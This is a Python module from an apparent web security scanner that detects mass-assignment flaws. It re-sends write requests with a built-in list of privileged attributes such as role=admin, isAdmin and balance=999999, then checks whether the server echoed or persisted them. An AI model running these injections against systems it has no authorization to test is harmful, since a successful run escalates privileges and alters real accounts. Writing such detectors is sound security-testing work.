"""mass-assign - privileged-attribute injection (mass-assignment) detector.

Register/update endpoints often bind the whole request body to the model, so a client can set attributes the UI never
sends - role=admin, isAdmin=true, verified=true, balance=... Mass-assignment is SILENT (the server 200s either way),
so the value is in the confirmation logic: mass-assign re-sends a baseline body with each privileged attribute injected
and flags acceptance - the attribute echoed back in the response, or (with --verify) a follow-up read showing the
elevated state actually persisted.

  mass-assign https://api.tld/api/register --data '{"email":"x@y.z","password":"Pw1!"}'
  mass-assign https://api.tld/api/account -X PUT -H "Authorization: Bearer <t>" --data '{"name":"x"}' --verify https://api.tld/api/me
"""
from __future__ import annotations

import json
from urllib.parse import urlparse

from ..core import http
from ..core.args import add_common_args, add_header_arg
from ..core.envelope import debug_logger, output_result

NAME = "mass-assign"
KIND = "findings"
HELP = ("Detect mass-assignment: re-send a write body with privileged attributes injected (role=admin, isAdmin, "
        "verified, balance, ...) and flag acceptance (echoed, or confirmed via --verify). Non-destructive to others.")

# (attribute, value) privileged fields the UI would never let a client set
_PRIV = [("role", "admin"), ("role", "administrator"), ("roles", ["admin"]), ("isAdmin", True), ("is_admin", True),
         ("admin", True), ("isStaff", True), ("verified", True), ("isVerified", True), ("email_verified", True),
         ("active", True), ("enabled", True), ("premium", True), ("plan", "enterprise"),
         ("permissions", ["admin"]), ("scope", "admin"), ("balance", 999999), ("credit", 999999),
         ("account_type", "admin"), ("group", "admins")]


def add_arguments(parser) -> None:
    parser.add_argument("target", help="the write endpoint, e.g. https://x/api/register or /api/account")
    parser.add_argument("--data", "-D", dest="data", default="{}", help="baseline JSON body the endpoint expects")
    parser.add_argument("--method", "-X", dest="method", default="POST", help="POST (default) | PUT | PATCH")
    parser.add_argument("--verify", default=None,
                        help="a read endpoint (e.g. /api/me) to CONFIRM the elevated state persisted")
    add_header_arg(parser)
    add_common_args(parser)


def _hmap(args):
    d = {"Content-Type": "application/json"}
    for h in (getattr(args, "header", None) or []):
        if ":" in h:
            k, v = h.split(":", 1)
            d[k.strip()] = v.strip()
    return d


def run(args) -> int:
    dbg = debug_logger(args.debug)
    target = args.target.strip()
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    try:
        base = json.loads(args.data) if args.data else {}
        if not isinstance(base, dict):
            raise ValueError
    except ValueError:
        output_result([], args.output, "--data must be a JSON object.")
        return 1
    method = (args.method or "POST").upper()
    sess = http.session(extra_headers=_hmap(args))
    findings = []

    def marker(v):
        return json.dumps(v).strip('"[]')          # a substring to look for in the echo/verify

    for attr, val in _PRIV:
        body = dict(base)
        body[attr] = val
        try:
            r = http.send(method, target, sess=sess, data=json.dumps(body), timeout=12, allow_redirects=False)
        except Exception:  # noqa: BLE001
            continue
        st = r.get("status")
        if st not in (200, 201, 202):
            continue
        echoed = f'"{attr}"' in (r.get("body") or "") and marker(val) in (r.get("body") or "")
        confirmed = False
        if args.verify:
            try:
                vr = http.send("GET", args.verify, sess=sess, timeout=10, allow_redirects=False)
                confirmed = f'"{attr}"' in (vr.get("body") or "") and marker(val) in (vr.get("body") or "")
            except Exception:  # noqa: BLE001
                pass
        if confirmed:
            findings.append({"severity": "high", "title": f"Mass-assignment: '{attr}={marker(val)}' persisted",
                             "url": target, "info": f"{method} accepted a client-set '{attr}={marker(val)}' and "
                             f"{urlparse(args.verify).path} confirms it stuck (privilege/state escalation)."})
        elif echoed:
            findings.append({"severity": "medium", "title": f"Possible mass-assignment: '{attr}' echoed",
                             "url": target, "info": f"{method} 200 echoed client-set '{attr}={marker(val)}' — "
                             f"pass --verify <read-endpoint> to confirm it persists (not just reflected)."})
    dbg(f"mass-assign: {len(findings)} accepted privileged attribute(s)")
    output_result(findings, args.output)
    return 0
